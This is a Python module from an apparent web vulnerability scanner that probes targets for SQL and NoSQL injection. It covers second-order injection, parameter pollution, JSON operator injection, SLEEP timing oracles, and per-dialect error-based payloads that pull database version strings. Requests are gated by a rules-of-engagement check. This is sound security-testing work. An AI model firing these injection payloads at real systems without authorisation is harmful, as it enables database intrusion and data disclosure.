"""SQLi tier-2: second-order, chunked-query HPP, JSON-context, boolean-
timing hardening, error-based without UNION.

Every probe routes through engine.http. Probes here do NOT duplicate the
tier-1 sqli.py matrix — they test channels that tier-1 doesn't:

  second_order        -- write payload to identity/store, walk readers
  chunked_query       -- HPP + multi-statement semicolon (MySQL)
  json_context        -- JSON $where collision (server concat into
                         SQL/NoSQL)
  boolean_timing      -- 4-sigma threshold on top of Mann-Whitney test
  error_based         -- per-dialect error-channel data extraction
                         without requiring column-count alignment
"""
from __future__ import annotations

import json
import re

from ..config import load_engine
from ..roe_guard import ROEGuard, ROEViolation
from .. import http as _http


SECOND_ORDER_PAYLOADS = [
    "admin'-- -",
    "admin' OR '1'='1",
    "admin' UNION SELECT NULL-- -",
    "admin' UNION SELECT NULL,NULL-- -",
    "x'; SELECT 1-- -",
]


CHUNKED_QUERY_PAYLOADS = [
    "1; SELECT SLEEP(0)",
    "1; SELECT 1",
    "1;-- -",
    "1 UNION SELECT NULL-- -",
]


JSON_CONTEXT_PROBES = [
    {"$where": "return true"},
    {"$where": "sleep(0)"},
    {"$where": "this.field == 'x' || true"},
    {"username": {"$ne": None}},
    {"username": {"$regex": "^a"}},
]


DIALECT_ERROR_PAYLOADS = {
    "mysql": [
        "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- -",
        "' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)-- -",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),"
        "FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    ],
    "postgres": [
        "' AND 1=CAST((SELECT version()) AS int)-- -",
        "'; DO $$ BEGIN RAISE EXCEPTION (SELECT version()); END $$-- -",
        "' AND 1=CAST((SELECT current_database()) AS int)-- -",
    ],
    "mssql": [
        "' AND 1=CONVERT(int,(SELECT @@version))-- -",
        "' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
        "'; SELECT * FROM sys.objects FOR JSON PATH-- -",
    ],
    "sqlite": [
        "' AND 1=CAST((SELECT sqlite_version()) AS int)-- -",
    ],
    "oracle": [
        "' AND 1=CAST((SELECT banner FROM v$version WHERE ROWNUM=1)"
        " AS int) FROM dual-- -",
    ],
}


ERROR_BODY_MARKERS = (
    "syntax error", "extractvalue", "updatexml", "cast", "convert",
    "invalid input syntax", "exception", "sqlstate", "error",
)


def _verify_tls():
    try:
        cfg = load_engine() or {}
        return bool(cfg.get("http", {}).get("verify_tls", True))
    except Exception:
        return True


def _roe_block(guard, url, method="GET"):
    if guard is None:
        try:
            guard = ROEGuard(engine_cfg=load_engine())
        except Exception as e:
            return "ROE guard unavailable (fail-closed): %s" % e
    try:
        guard.check_url(url, method)
        return None
    except ROEViolation as e:
        return str(e)


def _send(url, method, param=None, payload=None, json_body=None,
          headers=None, timeout=8, verify=None, roe_guard=None):
    if verify is None:
        verify = _verify_tls()
    viol = _roe_block(roe_guard, url, method)
    if viol:
        return {"blocked": True, "error": "ROE_BLOCK: " + viol}
    try:
        with _http.Client(timeout=timeout, verify=verify,
                          follow_redirects=False) as c:
            kwargs = {"headers": headers or {}}
            if json_body is not None:
                r = c.request(method.upper(), url, json=json_body, **kwargs)
            elif method.upper() == "POST":
                r = c.request(method.upper(), url,
                              data={param: payload}, **kwargs)
            else:
                r = c.get(url, params={param: payload}, **kwargs)
        return {"status": r.status_code, "body": (r.text or "")[:8000]}
    except Exception as e:
        return {"status": None, "error": "%s: %s" % (type(e).__name__, e)}


def _has_error_marker(body):
    low = (body or "").lower()
    return any(m in low for m in ERROR_BODY_MARKERS)


# --- second-order ---------------------------------------------------------

def probe_second_order(store_url, store_method="POST",
                        store_param="bio", payload="admin'-- -",
                        reader_endpoints=None, reader_method="GET",
                        reader_param="q", reader_value="1",
                        headers=None, timeout=8, roe_guard=None):
    """Write `payload` to a store endpoint, walk reader endpoints, detect
    if the stored payload corrupted a reader query (error or data change).

    reader_endpoints: list of URLs. Each is GET/POSTed with reader_param=
    reader_value. Verdict VULNERABLE when a reader returns an error body
    that the baseline (pre-store) reader did not.
    """
    if not store_url or not reader_endpoints:
        return {"verdict": "UNKNOWN",
                "reason": "second-order probe needs store_url + "
                          "reader_endpoints",
                "evidence": {}}
    baselines = {}
    for r_url in reader_endpoints:
        r0 = _send(r_url, reader_method, param=reader_param,
                    payload=reader_value, headers=headers,
                    timeout=timeout, roe_guard=roe_guard)
        if r0.get("blocked"):
            return {"verdict": "UNKNOWN", "reason": r0["error"],
                    "evidence": {}}
        baselines[r_url] = {"status": r0.get("status"),
                              "error_marker": _has_error_marker(
                                  r0.get("body") or "")}
    store = _send(store_url, store_method, param=store_param,
                   payload=payload, headers=headers,
                   timeout=timeout, roe_guard=roe_guard)
    if store.get("blocked"):
        return {"verdict": "UNKNOWN", "reason": store["error"],
                "evidence": {}}
    if store.get("status") is None:
        return {"verdict": "UNKNOWN",
                "reason": "store request failed: %s" % store.get("error"),
                "evidence": {"store_status": None}}
    reads = []
    confirmed = []
    for r_url in reader_endpoints:
        r = _send(r_url, reader_method, param=reader_param,
                    payload=reader_value, headers=headers,
                    timeout=timeout, roe_guard=roe_guard)
        if r.get("blocked"):
            return {"verdict": "UNKNOWN", "reason": r["error"],
                    "evidence": {"reads": reads}}
        b = baselines.get(r_url) or {}
        new_marker = _has_error_marker(r.get("body") or "")
        entry = {
            "reader": r_url,
            "status": r.get("status"),
            "baseline_status": b.get("status"),
            "error_marker": new_marker,
            "baseline_error_marker": b.get("error_marker"),
        }
        reads.append(entry)
        if new_marker and not b.get("error_marker"):
            confirmed.append(entry)
        elif (r.get("status") != b.get("status")
                and r.get("status") is not None):
            confirmed.append(entry)
    if confirmed:
        return {
            "verdict": "VULNERABLE",
            "reason": "stored payload changed reader behavior on %d "
                      "endpoint(s)" % len(confirmed),
            "evidence": {"store_status": store.get("status"),
                          "reads": reads,
                          "confirmed": confirmed,
                          "payload_used": payload},
            "second_order_confirmed": True,
        }
    return {
        "verdict": "PASS",
        "reason": "stored payload did not change reader behavior",
        "evidence": {"store_status": store.get("status"), "reads": reads},
        "second_order_confirmed": False,
    }


# --- chunked-query HPP ---------------------------------------------------

def probe_chunked_query(url, param="id", method="GET",
                          baseline_value="1", headers=None,
                          timeout=8, roe_guard=None):
    """Send multi-value HPP with a semicolon payload; detect error-surface."""
    viol = _roe_block(roe_guard, url, method)
    if viol:
        return {"verdict": "UNKNOWN", "reason": "ROE_BLOCK: " + viol,
                "evidence": {}}
    verify = _verify_tls()
    attempts = []
    for payload in CHUNKED_QUERY_PAYLOADS:
        pairs = [(param, baseline_value), (param, payload)]
        try:
            with _http.Client(timeout=timeout, verify=verify,
                              follow_redirects=False) as c:
                if method.upper() == "POST":
                    body = "&".join("%s=%s" % (k, v) for k, v in pairs)
                    r = c.post(url, content=body.encode(),
                                headers={**(headers or {}),
                                          "Content-Type":
                                          "application/x-www-form-urlencoded"})
                else:
                    r = c.get(url, params=pairs, headers=headers or {})
        except Exception as e:
            attempts.append({"payload": payload,
                              "error": "%s: %s" % (type(e).__name__, e)})
            continue
        hits = [m for m in ERROR_BODY_MARKERS
                if m in (r.text or "").lower()]
        attempts.append({
            "payload": payload,
            "status": r.status_code,
            "error_signatures": hits,
        })
    confirmed = [a for a in attempts if a.get("error_signatures")]
    if confirmed:
        return {
            "verdict": "SUSPICIOUS",
            "reason": "HPP + semicolon payload surfaced SQL error on %d "
                      "attempt(s)" % len(confirmed),
            "evidence": {"attempts": attempts},
        }
    live = [a for a in attempts if a.get("status") is not None]
    if not live:
        return {"verdict": "UNKNOWN",
                "reason": "all chunked-query attempts failed",
                "evidence": {"attempts": attempts}}
    return {"verdict": "PASS",
            "reason": "no SQL error surfaced across %d attempt(s)"
                      % len(live),
            "evidence": {"attempts": attempts}}


# --- JSON-context --------------------------------------------------------

def probe_json_context(url, method="POST", headers=None,
                        timeout=8, roe_guard=None):
    """Send JSON operator payloads; detect SQL/NoSQL error surfaces."""
    attempts = []
    for body in JSON_CONTEXT_PROBES:
        r = _send(url, method, json_body=body, headers=headers,
                    timeout=timeout, roe_guard=roe_guard)
        if r.get("blocked"):
            return {"verdict": "UNKNOWN", "reason": r["error"],
                    "evidence": {"attempts": attempts}}
        marker = _has_error_marker(r.get("body") or "")
        attempts.append({
            "payload": body,
            "status": r.get("status"),
            "error_marker": marker,
        })
    confirmed = [a for a in attempts if a["error_marker"]]
    if confirmed:
        return {
            "verdict": "SUSPICIOUS",
            "reason": "JSON operator injection surfaced a database error "
                      "on %d payload(s)" % len(confirmed),
            "evidence": {"attempts": attempts},
        }
    live = [a for a in attempts if a.get("status") is not None]
    if not live:
        return {"verdict": "UNKNOWN",
                "reason": "all JSON-context probes failed",
                "evidence": {"attempts": attempts}}
    return {"verdict": "PASS",
            "reason": "JSON operators did not surface a database error",
            "evidence": {"attempts": attempts}}


# --- boolean-timing hardening --------------------------------------------

def probe_boolean_timing(url, param="id", method="GET",
                          baseline_samples=6, payload_samples=6,
                          sleep_seconds=3, sigma_threshold=4.0,
                          headers=None, timeout=15, roe_guard=None):
    """Timing oracle with variance-aware threshold.

    Baseline = `param=1` requests. Payload = `param=1 AND SLEEP(N)`.
    Signal confirmed when:
      median(payload) - median(baseline) > max(sigma_threshold * sigma,
                                                500ms)
    AND (Mann-Whitney p < 0.05 via stats helper, when samples allow).
    """
    from .. import stats
    baselines = []
    for _ in range(baseline_samples):
        r = _send(url, method, param=param, payload="1",
                    headers=headers, timeout=timeout,
                    roe_guard=roe_guard)
        if r.get("blocked"):
            return {"verdict": "UNKNOWN", "reason": r["error"],
                    "evidence": {}}
        if r.get("status") is None:
            continue
        baselines.append(_timed_request_ms(url, method, param, "1",
                                            headers, timeout))
    # _timed_request_ms runs its own timing loop; the _send above is just
    # an ROE/availability gate.
    baselines = [b for b in baselines if b is not None]
    if len(baselines) < 3:
        return {"verdict": "UNKNOWN",
                "reason": "insufficient baseline samples",
                "evidence": {"baselines": baselines}}
    payloads = []
    for _ in range(payload_samples):
        t = _timed_request_ms(url, method, param,
                                "1 AND SLEEP(%d)" % sleep_seconds,
                                headers, timeout + sleep_seconds + 3)
        if t is not None:
            payloads.append(t)
    if len(payloads) < 3:
        return {"verdict": "UNKNOWN",
                "reason": "insufficient payload samples",
                "evidence": {"baselines": baselines, "payloads": payloads}}
    base_med = stats.median(baselines)
    pay_med = stats.median(payloads)
    delta = pay_med - base_med
    sigma = stats.robust_scale(baselines) or 0.0
    threshold = max(sigma_threshold * sigma, 500.0)
    mw = stats.mann_whitney_u(baselines, payloads)
    evidence = {
        "baselines_ms": [round(b, 1) for b in baselines],
        "payloads_ms": [round(b, 1) for b in payloads],
        "baseline_median_ms": round(base_med, 1),
        "payload_median_ms": round(pay_med, 1),
        "delta_ms": round(delta, 1),
        "sigma_ms": round(sigma, 1),
        "sigma_threshold": sigma_threshold,
        "variance_threshold_ms": round(threshold, 1),
        "mann_whitney": mw,
    }
    variance_ok = delta > threshold
    mw_ok = bool(mw and mw.get("p", 1.0) < 0.05)
    if variance_ok and (mw_ok or mw is None):
        return {"verdict": "SUSPICIOUS",
                "reason": ("boolean-timing: delta %.0fms > %.0fms "
                            "(4-sigma) and MW p=%s"
                            % (delta, threshold,
                                mw.get("p") if mw else "n/a")),
                "evidence": evidence}
    return {"verdict": "PASS",
            "reason": "no variance-aware timing signal",
            "evidence": evidence}


def _timed_request_ms(url, method, param, payload, headers, timeout):
    import time
    viol = _roe_block(None, url, method)  # Reuse default guard
    if viol:
        return None
    try:
        t0 = time.monotonic()
        with _http.Client(timeout=timeout, follow_redirects=False) as c:
            if method.upper() == "POST":
                c.post(url, data={param: payload}, headers=headers or {})
            else:
                c.get(url, params={param: payload}, headers=headers or {})
        return (time.monotonic() - t0) * 1000.0
    except Exception:
        return None


# --- error-based without UNION -------------------------------------------

_MARKER_VERSION_RE = re.compile(
    r"~([0-9]+\.[0-9]+\.[0-9]+[^\~]*)~"
)


def probe_error_based(url, param="id", method="GET", dbms=None,
                       headers=None, timeout=8, roe_guard=None):
    """Send per-dialect error payloads; if a version-shaped marker comes
    back in the error body, data leaked via the error channel."""
    dialects = [dbms] if dbms else list(DIALECT_ERROR_PAYLOADS.keys())
    attempts = []
    for dialect in dialects:
        for payload in DIALECT_ERROR_PAYLOADS.get(dialect, []):
            r = _send(url, method, param=param, payload=payload,
                        headers=headers, timeout=timeout,
                        roe_guard=roe_guard)
            if r.get("blocked"):
                return {"verdict": "UNKNOWN", "reason": r["error"],
                        "evidence": {"attempts": attempts}}
            body = r.get("body") or ""
            marker_hit = None
            if _has_error_marker(body):
                m = _MARKER_VERSION_RE.search(body)
                if m:
                    marker_hit = m.group(1)[:80]
            attempts.append({
                "dialect": dialect,
                "payload": payload,
                "status": r.get("status"),
                "error_marker": _has_error_marker(body),
                "extracted_marker": marker_hit,
            })
            if marker_hit:
                return {
                    "verdict": "VULNERABLE",
                    "reason": ("error-based channel leaked data '%s' via "
                                "%s payload" % (marker_hit, dialect)),
                    "evidence": {"attempts": attempts,
                                  "leaked": marker_hit,
                                  "dialect": dialect},
                }
    live = [a for a in attempts if a.get("status") is not None]
    if not live:
        return {"verdict": "UNKNOWN",
                "reason": "all error-based probes failed",
                "evidence": {"attempts": attempts}}
    any_error = any(a["error_marker"] for a in live)
    if any_error:
        return {"verdict": "SUSPICIOUS",
                "reason": "error body surfaced DB-specific text but no "
                          "version-shaped marker",
                "evidence": {"attempts": attempts}}
    return {"verdict": "PASS",
            "reason": "no error-channel disclosure across %d probe(s)"
                      % len(live),
            "evidence": {"attempts": attempts}}
